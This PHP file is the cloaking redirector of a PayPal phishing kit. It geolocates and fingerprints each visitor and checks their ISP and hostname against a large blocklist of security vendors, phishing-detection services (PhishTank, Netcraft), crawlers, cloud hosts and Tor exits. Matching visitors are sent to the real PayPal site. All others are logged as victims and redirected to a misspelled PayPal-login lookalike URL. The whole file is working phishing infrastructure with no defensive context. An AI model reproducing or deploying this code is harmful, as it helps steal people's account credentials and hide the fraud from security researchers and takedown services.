<?php

if (isset($_GET["sc1"])) {
    $url = "https://mailer.edlibre.com/users/pypI.conirmion-loginbun.in0-instumentlpypmlogins";
} elseif (isset($_GET["sc2"])) {
    $url = "http://digital-ventures.net/mailagent/users/?sc1";
}

$cuih       = "https://www.paypal.com/";
$ip         = '' . $_SERVER['REMOTE_ADDR'] . '';
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$momo       = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$today      = getdate();
$date       = date("F j, Y, g:i a");

function getOS()
{
    global $user_agent;
    $os_platform = "Another";
    $os_array    = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );
    
    foreach ($os_array as $regex => $value) {
        
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
        
    }
    
    return $os_platform;
    
}
function get_browser_name($user_agent)
{
    if (strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR/'))
        return 'Opera';
    elseif (strpos($user_agent, 'Edge'))
        return 'Edge';
    elseif (strpos($user_agent, 'Chrome'))
        return 'Chrome';
    elseif (strpos($user_agent, 'Safari'))
        return 'Safari';
    elseif (strpos($user_agent, 'Firefox'))
        return 'Firefox';
    elseif (strpos($user_agent, 'MSIE') || strpos($user_agent, 'Trident/7'))
        return 'Internet Explorer';
    
    return 'Other';
}
$user_os      = getOS();
$user_browser = get_browser_name($_SERVER['HTTP_USER_AGENT']);
$curl2        = curl_init();
curl_setopt($curl2, CURLOPT_URL, 'http://ip-api.com/json/' . $ip);
curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl2, CURLOPT_FOLLOWLOCATION, true);
$content2 = curl_exec($curl2);
curl_close($curl2);
$details2 = json_decode($content2);
$ne       = $details2->country;
$re       = $details2->regionName;
$zip      = $details2->zip;
$oe       = $details2->countryCode;
$isp      = $details2->isp;
$botmo    = array('amazon','Amazon.com, Inc.','aruba','above','google','googlefiber','Microsoft Corporation','tor','softlayer','GoDaddy','amazonaws','cyveillance','phishtank','dreamhost','netpilot','calyxinstitute','tor-exit','msnbot','volgaline.ru','TTK-Retail','p3pwgdsn','netcraft','69.164.111.198','Sungard Availability Network Solutions','banff','auchroisk','Webzilla B.V.','trendmicro','ebay','NHN','Kaspersky Lab AO','D-Hosting GmbH','Web2Objects LLC','Kaspersky Lab ZAO','Internap Network Services Corporation','Total Server Solutions L.L.C.','wiredns.net','paypal','Kaspersky Lab','torservers','Netinternet Bilisim Teknolojileri','Shenzhen Tencent Computer Systems Company Limited','Klayer LLC','Yandex LLC','Yandex network','spider.yandex.com','Contabo GmbH','PT. Awan Kilat Semesta','103.129.223.126','enti27.ablanet.it','Yandex enterprise network','Alibaba.com LLC','.kuleuven.be','BELNET','comodo','crawl','OVH SAS','OVH','sucuri.net','Kazakhtelecom Data Network Administration','crawler','secureserver','Ziply Fiber','Automattic, Inc','Smartsystems LLC','TIMEWEB Co Ltd.','Packet Exchange Limited','timeweb.ru','example.com','Alibaba.com LLC','Maxihost LLC','PacketExchange','1&1 IONOS SE','Nobis Technology Group','proxy','enom','FranTech Solutions','cloudflare','yahoo','trustwave','Cisco OpenDNS, LLC','tfbnw.net','.eu','mayacyberworld.com','ovh.net','centralnic','badware','phishing','HIVELOCITY, Inc.','antivirus','SiteAdvisor','McAfee','DDoSING Network Attack Protection','Digital Ocean','Bitdefender','barracuda','Server Mania Inc','phis','tester','subdomain.oftest.net','Tinet SpA','Contabo Inc.','bit','security','secure','52.168.72.225','cloud','162.243.187.126','46.101.94.163','173.224.164.12','PayPal, Inc.','40.94.27.63','54.36.38.115','40.94.35.97','91.134.17.242','91.134.17.251','185.187.30.12','Scalair FR hosting','Scalair','185.187.30.13','92.222.150.177','54.36.38.123','145.239.227.217','178.32.115.21','OVH ISP','91.134.109.0','91.134.17.236','185.187.30.14','145.239.227.219','91.134.17.254','91.134.17.244','40.94.34.18','23.250.125.134','ColoCrossing','208.117.252.7','Google LLC','46.105.35.73','136.60.228.242','Google Fiber Inc.','40.94.20.14','70.42.131.106','Internap Corporation','40.107.235.7','54.36.38.122','91.103.66.205','91.103.66.*','Palo Alto Networks','Google Fiber','141.98.252.161','181.215.76.30','52.250.30.131','91.103.66.207','M247 Ltd','parked.factioninc.com','86.106.87.90','185.130.184.208','104.129.192.55','Zscaler','Datacamp','DediPath','ExpressVPN','84.17.42.25','91.134.17.235','45.56.151.57','192.186.132.20','46.244.28.208','65.155.30.101','74.217.90.250','70.42.131.189','23.228.129.11','104.243.212.7','45.132.227.240','66.129.102.52','70.42.242.100','91.134.17.250','178.33.41.206','46.105.37.67','165.225.39.105','91.134.17.245','91.134.17.237','40.94.96.89','173.239.197.50','167.71.117.147','91.134.17.241','91.134.17.243','65.154.226.109','136.22.130.11','YouTube, LLC','136.37.169.189','136.34.23.69','40.107.240.5','Azure','52.139.23.157','17.225.16.18','Apple','17.207.49.22','38.135.95.34','LookingGlass Cyber Solutions','208.80.194.27','Forcepoint, LLC','208.80.194.32','23.105.110.225','Leaseweb USA, Inc','LeaseWeb Netherlands B.V.','191.101.170.65','Digital Energy Technologies Chile SpA','65.154.226.220','65.154.226.100','DigitalOcean, LLC','46.101.119.24','Peak 10','M247 Ltd','Quasi Networks LTD','SC Rusnano','GoDaddy.com, LLC','Server Plan S.r.l.','Linode','Blazing SEO','Keliweb S.R.L','MOJOHOST','Lixux OU','Inter Connects Inc','Flokinet Ltd','LukMAN Multimedia Sp. z o.o','PIPEX-BLOCK1','IPVanish','LinkGrid LLC','Snab-Inform Private Enterprise','Cisco Systems','Network and Information Technoresulty Limited','London Wires Ltd.','Tehnoresultii Budushego LLC','Eonix Corporation','hosttech GmbH','Wowrack.com','SunGard Availability Services LP','PlusNet Technoresulties Ltd','Scaleway','Facebook','facebook.com','Host1Plus','Nobis Technoresulty Group','DME Hosting LLC','Prescient Software','Sungard Network Solutions','Iomart Hosting Ltd','Hosting Solution','Barracuda Networks','Solar VPS','PHPNET Hosting Services','Hosting Services','DigitalOcean','Chelyabinsk-Signal LLC','SoftLayer Technoresulties','Complete Internet Access','london-tor.mooo.com','tor.piratenpartei-nrw.de','DFRI','cpanel66.proisp.no','tor-node.com','Involta','exit0.liskov.tor-relays.net','tor.tocici.com','University of Virginia','EGIHosting','ebbs.healingpathsolutions.com','healingpathsolutions.com','Solution Pro','Zayo Bandwidth','spider.clicktargetdevelopment.com','clicktargetdevelopment.com','static.spro.net','Blue Coat Systems','GANDI SAS','roamsite.com','ColoUp','Westnet','The University of Tokyo','University','University of','QuadraNet','exit-01a.noisetor.net','noisetor.net','noisetor','vultr.com','Choopa','RedSwitches Pty','Quintex Alliance Consulting','www16.mailshell.com','this.is.a.tor.exit-node.net','this.is.a.tor.node.xmission.com','colocrossing.com','DedFiberCo','avirasoft','phishtank.com','googleusercontent','Yahoo','Yahoo! Inc.','Google','Google Inc.','Amazon Technoresulties Inc.','Amazon','Top Level Hosting SRL','Twitter','Twitter Inc.','Microsoft','VPSmalaysia.com.my','Madgenius.com','Barracuda Networks Inc.','Barracuda','SecuredConnectivity.net','Digital Domain','Hetzner Online','Hetzner Online GmbH','Akamai','SoftLayer','SURFnet','Creative Thought Inc.','Fastly','Return Path Inc.','WhatsApp','Instagram','Schulte Consulting LLC','Universidade Federal do Rio de Janeiro','Sectoor','Bitfolk','DIR A/S','Team Technoresulties LLC','Mainloop','Serbia','Secom','Junk Email Filter Inc.','Art Matrix - Lightlink Inc.','Redpill Linpro AS','CloudFlare','ESET spol. s r.o.','AVAST Software s.r.o.','Dosarrest','Apple Inc.','Symantec','Mozilla','Netprotect SRL','Host Europe GmbH','Host Sailor Ltd.','PSINet Inc.','Daniel James Austin','RamNode','Hostalia','Xs4all Internet BV','Eircom Customer Assignment','9New Network Inc','Sony','Private IP Address LAN','Computer Problem Solving','Fortinet','Avira','Rackspace','Baidu','Comodo','Incapsula Inc','Orange Polska Spolka Akcyjna','Infosphere','Private Customer','SurfControl','University of Newcastle upon Tyne','Total Server Solutions','LukMAN','eSecureData','Hosting','VI Na Host Co. Ltd','B2 Net Solutions','Master Internet','Global Perfomance','Fireeye','AntiVirus','Security','.sysms.net','DataSift Platform','Intersoft Internet','Voxility','Internet-Pro','Trustwave Holdings Inc','Trustwave Holdings','Online SAS','Trend Micro Incorporated','Online SAS NL','Versaweb','Liquid Web','A100 ROW','Keyweb AG IP Network','Apexis AG','Apexis','resulticWeb','HostRoyale Technologies Pvt Ltd','Virtual1 Limited','VNET a.s.','Static IP Assignment','TerraTransit AG','Merit Network','PathsConnect','Long Thrive','LG DACOM','Secure Internet','Kaspersky','UK Dedicated Servers Limited','Customer Network','Flokinet','Simpli Networks LLC','Psychz','PrivateSystems Networks','ScanSafe Services','CachedNet','CloudVPN','Whitelabel IT Solutions Corp','Hostwinds','Hosteros LLC','Mizanur Rahman t/a Maya Cyber World','HostUS','ClientID','Server','Oracle','Unus Inc.','Public facing services','Virtual Employee Pvt Ltd','Dataline Ltd','Teksavvy Solutions Inc.','UPC Romania Bucuresti','Global Data Networks LLC','Online S.A.S.','Content Delivery Network Ltd','Nobis Technoresulty Group LLC','Parrukatu','JSC ER-Telecom Holding','ChinaNet Fujian Province Network','QualityNetwork','Vist On-Line Ltd','The Calyx Institute','Internet Customers','OJSC Oao Tattelecom','Petersburg Internet Network Ltd.','Psychz Networks','Udasha','Onavo Mobile Ltd','Cubenode System SL','OVH Hosting Inc.','NForce Entertainment B.V.','NFOrce Entertainment BV','DigitalOcean LLC','Glenayre Electronics Inc.','Iomart Hosting Limited','Digital Energy Technoresulties Limited','Digital Energy Technoresulties Ltd.','Cisco Systems Inc.','Vultr Holdings LLC','Proofpoint, Inc.','Amazon.com Inc.','Web Hosting Solutions','Internet Security - TC','Ventelo Wholesale','MYX Group LLC','France Telecom S.A.','Nine Internet Solutions AG','Microsoft Azure','Choopa, LLC','HighWinds Network','Amazon.com','M247 LTD Frankfurt Infrastructure','Wintek Corporation','WestHost, Inc.','ServerMania','Claro Dominican Republic','TransIP BV','iNTERWERK.de','.liveboxserver.uk','power.hosterserver.com','HostDime.com','Compania De Informatica Aplicata SA','HostDime','Host1Plus Cloud Servers','SOVAM','Hawk Host Inc.','Amazon Data Services NoVa','Google Cloud','M-net','Digiweb ltd','.reverse-dns','mx2.1uptime.net','.hawkhost.com','Nexeon Technologies','giten.de','GigeNET','ZenLayer','NFOrce Entertainment B.V.','NewMedia Express','Telegram Messenger Network','IQ PL Sp. z o.o.','Datacamp Limited','Tahoe Internet Exchange (TahoeIX)','ITCOM Shpk');

function inStr($s, $as)
{
    $s = strtoupper($s);
    if (!is_array($as))
        $as = array(
            $as
        );
    for ($i = 0; $i < count($as); $i++)
        if (strpos(($s), strtoupper($as[$i])) !== false)
            return true;
    return false;
}
$host_victim = '' . $isp . ' - ' . $_SERVER['REMOTE_ADDR'] . ' - ' . gethostbyaddr($_SERVER['REMOTE_ADDR']) . '';
if (inStr($host_victim, $botmo)) {
    $file = fopen("iplog.html", "a");
    fwrite($file, "<font style='font-family:tahoma;font-size: 13px;' color='red'>BOT => [".$oe."] - ".$ip." - ".$re." - ".$isp." - ".$user_os." - ".$user_browser." - ".$momo." | Direct to  ".$cuih." </font><br>");
    fclose($file);
    header("LOCATION: $cuih");
    die();
} else {
    $file = fopen("iplog.html", "a");
    fwrite($file, "<font style='font-family:tahoma;font-size: 13px;' color='green'>Visitor => [".$oe."] - ".$ip." - ".$re." - ".$isp." - ".$user_os." - ".$user_browser." - ".$momo." | [ ".$date." ] </font><br>");
    header("LOCATION: $url");
}
?>
